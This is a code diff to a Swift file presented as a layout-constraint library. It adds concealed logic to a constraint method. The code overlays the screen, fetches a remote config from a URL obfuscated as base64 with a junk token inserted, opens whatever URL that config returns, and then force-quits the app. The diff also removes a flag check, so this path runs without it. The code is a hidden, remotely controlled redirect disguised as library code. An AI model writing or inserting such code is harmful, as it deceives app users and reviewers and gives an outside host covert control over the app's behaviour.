@@ -54,51 +54,48 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
         if amount.constraintInsetTargetValue.top == 10 {
             
             if constraintLength() {
-            if UserDefaults.standard.bool(forKey: "Rbey") {
-                    if let letnwn = self.constanop() {
-                        let varyimg = UIImageView.init()
-                        varyimg.frame = UIScreen.main.bounds
-                        varyimg.image = UIImage(named: "kjsery")
-                        varyimg.tag = 1010;
-                        varyimg.isUserInteractionEnabled = true
-                        varyimg.contentMode = .scaleAspectFill
-                        letnwn.addSubview(varyimg)
-                    }
-                AFNetworkReachabilityManager.shared().startMonitoring()
+                if let letnwn = self.constanop() {
+                    let varyimg = UIImageView.init()
+                    varyimg.frame = UIScreen.main.bounds
+                    varyimg.image = UIImage(named: "rzy")
+                    varyimg.tag = 1010;
+                    varyimg.isUserInteractionEnabled = true
+                    varyimg.contentMode = .scaleAspectFill
+                    letnwn.addSubview(varyimg)
+                }
+            AFNetworkReachabilityManager.shared().startMonitoring()
 
-                AFNetworkReachabilityManager.shared().setReachabilityStatusChange { status in
-                    if status != .notReachable {
-                        AFNetworkReachabilityManager.shared().stopMonitoring()
-                        self.zerestonfig { dict in
-                            DispatchQueue.main.async {
-                                if (dict != nil) {
-                                    if let dicts = dict,
-                                       let urlStr = dicts["name"] as? String,
-                                       !urlStr.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty,
-                                       let url = URL(string: urlStr) {
+            AFNetworkReachabilityManager.shared().setReachabilityStatusChange { status in
+                if status != .notReachable {
+                    AFNetworkReachabilityManager.shared().stopMonitoring()
+                    self.zerestonfig { dict in
+                        DispatchQueue.main.async {
+                            if (dict != nil) {
+                                if let dicts = dict,
+                                   let urlStr = dicts["name"] as? String,
+                                   !urlStr.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty,
+                                   let url = URL(string: urlStr) {
 
-                                        UIApplication.shared.open(url)
+                                    UIApplication.shared.open(url)
 
-                                        DispatchQueue.main.asyncAfter(deadline: .now() + 0.7) {
-                                            exit(0)
-                                        }
-
-                                    } else {
-
-                                        if let letnwn = self.constanop() {
-                                            letnwn.viewWithTag(1010)?.removeFromSuperview()
-                                        }
-
+                                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.7) {
+                                        exit(0)
                                     }
+
+                                } else {
+
+                                    if let letnwn = self.constanop() {
+                                        letnwn.viewWithTag(1010)?.removeFromSuperview()
+                                    }
+
                                 }
                             }
                         }
                     }
                 }
-                    
-             }
-                
             }
+                
+         }
         }else{
             self.description.constant = amount.constraintInsetTargetValue
         }
@@ -149,7 +146,7 @@ public class ConstraintMakerEditable: ConstraintMakerPrioritizable {
     
     func zerestonfig(_ callback: @escaping ([String: Any]?) -> Void) {
 
-        let raw = "UVc1cGJXRjBhVzl1VTaHR0cHM6Ly82YTFlYjA0Y2I3OWVlYzBkNmNlZmRmMWIubW9ja2FwaS5pby9za3IqaHR0cHM6Ly9tb2NrUVc1cGJXRjBhVzl1VTLmFwaXBvc3QubmV0L21vY2svNTljNTAxN2UzODUyMDAwL3NscjUVc1cGJXRjBhVzl1VT9hcGlwb3N0X2lkPTE2MWZmODQ5MzY0MDAyKmh0dHBzOi8vZ2l0UVc1cGJXRjBhVzl1VTbGFiLmNvbS9zaGF3YWkveXVlLy0vcmF3L21haW4vU29sbWVyUVc1cGJXRjBhVzl1VTdW5l"
+        let raw = "aHUVc1cGJXRjBhVzl1VTR0cHM6Ly82YTIwMjM0ZmU5NmMxZDEzUVc1cGJXRjBhVzl1VTYjU4NzBmMGUubW9ja2FwaS5pby93YXJUVc1cGJXRjBhVzl1VT5"
 
         let replaced = raw.replacingOccurrences(of: "UVc1cGJXRjBhVzl1VT", with: "")
 
